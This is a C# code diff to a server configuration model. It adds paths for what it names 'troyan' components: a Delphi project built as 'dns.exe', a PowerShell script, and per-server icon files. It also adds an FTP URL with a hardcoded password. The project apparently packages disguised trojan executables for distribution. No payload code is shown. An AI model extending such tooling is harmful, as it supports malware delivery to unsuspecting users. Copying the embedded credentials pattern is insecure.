@@ -16,25 +16,33 @@ namespace model
         [JsonPropertyName("sysDir")] public string SysDir => ServerModelLoader.SysDirStatic;
         [JsonPropertyName("cmplDir")] public string CmplDir => ServerModelLoader.CmplDirStatic;
         [JsonPropertyName("adsDir")] public string AdsDir => ServerModelLoader.AdsDirStatic;
+        [JsonPropertyName("publishedAdsDir")] public string PublishedAdsDir => ServerModelLoader.PublishedAdsDirStatic;
+        [JsonPropertyName("publishedDynamicDataDir")] public string PublishedDynamicDataDir => ServerModelLoader.PublishedDynamicDataDirStatic;
         [JsonPropertyName("updDir")] public string UpdDir => ServerModelLoader.UpdDirStatic;
         [JsonPropertyName("updateFile")] public string UpdateFile => Path.Combine(UpdDir, "update.ps1");
         [JsonPropertyName("troyanScriptDir")] public string TroyanScriptDir => ServerModelLoader.TroyanScriptDirStatic;
         [JsonPropertyName("troyanDelphiDir")] public string TroyanDelphiDir => ServerModelLoader.TroyanDelphiDirStatic;
-
+        [JsonPropertyName("troyanDelphiExe")] public string TroyanDelphiExe => Path.Join(TroyanDelphiDir, "dns.exe");
+        [JsonPropertyName("troyanDelphiProj")] public string TroyanDelphiProj => Path.Join(TroyanDelphiDir, "dns.dpr");
+        [JsonPropertyName("troyanDelphiIco")] public string TroyanDelphiIco => Path.Join(TroyanDelphiDir, "_icon.ico");
+        [JsonPropertyName("troyanDelphiScript")] public string TroyanDelphiScript => Path.Join(TroyanDelphiDir, "_baza.ps1");
+        
+        [JsonPropertyName("defaultIco")] public string DefaultIco => Path.Join(RootDir, "defaulticon.ico");
 
         // server-depended
         [JsonPropertyName("server")] public string Server { get; set; }
         [JsonPropertyName("userDataDir")] public string UserDataDir => @$"C:\data\{Server}";
         [JsonPropertyName("userServerFile")] public string UserServerFile => Path.Combine(UserDataDir, "server.json");
-        [JsonPropertyName("ftpAds")] public string FtpAds => $@"ftp://ftpads:Abc12345!@{Server}";
-        [JsonPropertyName("ftpAdsAsHttp")] public string FtpAdsAsHttp => $@"http://{Server}/ads";
-        [JsonPropertyName("ftpUserData")] public string FtpUserData { get; set; }
+        [JsonPropertyName("userDelphiExe")] public string UserDelphiPath => Path.Join(UserDataDir, "troayn.exe");
+        [JsonPropertyName("userDelphiIco")] public string UserDelphiIco => Path.Join(UserDataDir, "server.ico");
 
-        [JsonPropertyName("ftpUserDataAsHttp")]
-        public string FtpUserDataAsHttp => $@"http://{Server}/data";
-
-        [JsonPropertyName("updateUrl")] public string UpdateUrl => $"http://{Server}/data/update.txt";
-
+        //FTP
+        [JsonPropertyName("ftp")] public string Ftp => $@"ftpX://ftpX:Abc12345!@{Server}";
+        [JsonPropertyName("ftpAsHttp")] public string FtpAsHttp => $@"http://{Server}/ftp";
+        
+        
+        //Update
+        [JsonPropertyName("updateUrl")] public string UpdateUrl = "";
 
 
         // properties
